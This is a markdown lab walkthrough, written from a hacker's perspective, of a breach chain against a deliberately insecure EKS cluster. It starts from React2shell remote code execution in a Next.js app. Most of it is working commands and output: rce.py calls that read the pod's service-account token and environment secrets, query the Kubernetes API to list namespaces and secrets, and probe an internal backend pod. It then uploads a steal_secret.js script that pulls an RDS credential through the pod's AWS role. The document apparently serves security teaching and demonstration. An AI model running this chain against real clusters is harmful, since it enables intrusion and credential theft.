# reat2shell: EKS Breach

[Back](../README.md)

- [reat2shell: EKS Breach](#reat2shell-eks-breach)
  - [Overview](#overview)
    - [Steps](#steps)
  - [Setup EKS \& app](#setup-eks--app)
  - [Code Layer - Get react runtime info](#code-layer---get-react-runtime-info)
  - [Container Layer - Get sensitive data in container](#container-layer---get-sensitive-data-in-container)
    - [Container secret \& Service account token](#container-secret--service-account-token)
    - [Access API Server](#access-api-server)
  - [Cluster Layer - Get sensitive data in cluster](#cluster-layer---get-sensitive-data-in-cluster)
    - [Cluster secret](#cluster-secret)
    - [Access internal api](#access-internal-api)
  - [Cloud Layer - Get sensitive data in cloud](#cloud-layer---get-sensitive-data-in-cloud)
  - [Attack Chain Summary](#attack-chain-summary)

---

## Overview

- Perspective: Hacker
- Goal: show how a hacker exploits via `React2shell`
- Environment:
  - infra: eks-insecure
  - manifests: insecure-apps
- Url: `http://react2shell.arguswatcher.net:3000`

---

### Steps

| #   | Steps                           | Layers    | Milestone                                      |
| --- | ------------------------------- | --------- | ---------------------------------------------- |
| 0   | Setup EKS & app                 | -         | EKS cluster & React app                        |
| 1   | Get react runtime info          | code      | id, distro                                     |
| 2   | Get sensitive data in container | container | container secret & sa token & apiserver access |
| 3   | Get sensitive data in cluster   | cluster   | cluster secret, internal api                   |
| 4   | Get sensitive data in cloud     | cloud     | rds secret                                     |

---

## Setup EKS & app

- Environment:
  - infra: eks-insecure
  - manifests: insecure-apps

```sh
# provision eks cluster
terraform -chdir=infra/eks-insecure apply -auto-approve
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-insecure

# deploy apps
kubectl apply -f argocd/insecure-root-app.yaml
# port forward
kubectl port-forward service/react2shell -n react 3000:3000

```

## Code Layer - Get react runtime info

```sh
VICTIM_URL="http://react2shell.arguswatcher.net:3000"

# try
python scripts/rce.py $VICTIM_URL id
# executable response:
# uid=0(root) gid=0(root) groups=0(root)

# get distro
python scripts/rce.py $VICTIM_URL "cat /etc/os-release"
# executable response:
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
# NAME="Debian GNU/Linux"
# VERSION_ID="12"
# VERSION="12 (bookworm)"
# VERSION_CODENAME=bookworm
# ID=debian
# HOME_URL="https://www.debian.org/"
# SUPPORT_URL="https://www.debian.org/support"
# BUG_REPORT_URL="https://bugs.debian.org/"
```

---

## Container Layer - Get sensitive data in container

### Container secret & Service account token

- Get container secret

```sh
# get pod tier flag
python scripts/rce.py $VICTIM_URL "printenv CONTAINER_SECRET"
# CoNtAinEr-sEcRet-InsECurE
```

- Get service account token

```sh
# get
python scripts/rce.py $VICTIM_URL "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
# executable response:
# total 0
# lrwxrwxrwx 1 root root 13 Oct  6 02:48 ca.crt -> ..data/ca.crt
# lrwxrwxrwx 1 root root 16 Oct  6 02:48 namespace -> ..data/namespace
# lrwxrwxrwx 1 root root 12 Oct  6 02:48 token -> ..data/token

# get ns
python scripts/rce.py $VICTIM_URL "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# executable response:
# insecure

# get token
python scripts/rce.py $VICTIM_URL "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# executable response:
# eyJhbGciOiJSUzI1NiIsImtpZCI6ImF6c0RoVDZOX1JXS0hjXzAtYjBtbndIbHBlT1IwOE9rTzY1VDhkN1hkTWMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5l...
```

---

### Access API Server

```sh
# try request api
python scripts/rce.py $VICTIM_URL "curl -sS https://kubernetes.default.svc"
# curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt

# request api
python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api"
# executable response:
# {
#   "kind": "APIVersions",
#   "versions": [
#     "v1"
#   ],
#   "serverAddressByClientCIDRs": [
#     {
#       "clientCIDR": "0.0.0.0/0",
#       "serverAddress": "172.19.0.3:6443"
#     }
#   ]
# }

# get pod
python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
# list all pods
      # "metadata": {
      #   "name": "react2shell-7cdb9b89b-zmzt9",
      #   "namespace": "insecure",
      # "spec": {
      #   "serviceAccountName": "react2shell",
      #   "serviceAccount": "react2shell",
      #   "containers": [
      #     {
      #       "name": "react2shell",
      #       "image": "docker.io/simonangelfong/react2shell:insecure",
```

---

## Cluster Layer - Get sensitive data in cluster

### Cluster secret

- Get cluster resources

```sh
# list ns
python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
      # "metadata": {
      #   "name": "argocd",
      # "metadata": {
      #   "name": "default",
      # "metadata": {
      #   "name": "insecure",
      # "metadata": {
      #   "name": "kube-system",
      # "metadata": {
      #   "name": "prod",
```

- Get cluster secret

```sh
# list secret in pod ns
python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
# executable response:
#   "metadata": {
#     "name": "cluster-secret",
#     "namespace": "prod",
#   },
#   "data": {
#     "password": "Y0x1U1Rlci1TZWNSZVQ="
#   },
#   "type": "Opaque"
# }

echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
# cLuSTer-SecReT
```

---

### Access internal api

```sh
python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure-backend/pods"
      # "metadata": {
      #   "name": "backend-api-795cdf78cd-mzg74",
      #   "namespace": "insecure-backend",
      # "spec": {
      #   "containers": [
      #     {
      #       "name": "nginx",
      #       "image": "nginx:latest",
      #      "ports": [
      #        {
      #          "containerPort": 80,
      #          "protocol": "TCP"
      #  "podIP": "10.244.241.201",

python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.244.241.201/api/v1/healthz"
# executable response:
# {"status":"healthy","message":"Service is running"}

python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.244.241.201/api/v1/users"
# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
```

---

## Cloud Layer - Get sensitive data in cloud

```sh
# ##############################
# Attack
# ##############################
# 1. detect IRSA — pod has an AWS identity
python3 scripts/rce.py $VICTIM_URL "env | grep AWS"
# AWS_ROLE_ARN=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
# AWS_STS_REGIONAL_ENDPOINTS=regional
# AWS_DEFAULT_REGION=ca-central-1
# AWS_REGION=ca-central-1

# get web id
python3 scripts/rce.py $VICTIM_URL "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
# eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...

# try aws CLI
python3 scripts/rce.py $VICTIM_URL "aws sts get-caller-identity"
# /bin/sh: 1: aws: not found

# 2. upload js
b64=$(base64 -w0 scripts/steal_secret.js)
python3 scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"

# 3. blast radius: the */* role lists secrets
python3 scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=list
# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606357E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7921088E9,"LastChangedDate":1.792173606666E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-mb3RtAygQ7r01zMpAb4UulrH4x":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}

# 4. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
# steal_secret.js:
# read IRSA token -> STS AssumeRoleWithWebIdentity -> Secrets Manager GetSecretValue
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"
# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=get secret=react2shell-eks-insecure-rds-credential
# {"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606659E9,"Name":"react2shell-eks-insecure-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-mb3RtAygQ7r01zMpAb4UulrH4x","VersionStages":["AWSCURRENT"]}
```

---

## Attack Chain Summary

| #   | Layer     | Vulnerability             | Exploit                    |
| --- | --------- | ------------------------- | -------------------------- |
| 1   | code      | Next.js (CVE-2025-55182)  | escalate root shell in pod |
| 2   | container |                           | get container secret       |
| 3   | container | token auto-mounted in pod | access kube api with token |
| 4   | cluster   | flat network              | access api in internal ns  |
| 5   | cluster   | permissive RBAC           | get cluster secret         |
| 6   | cloud     | permissive IRSA           | get cloud secret           |
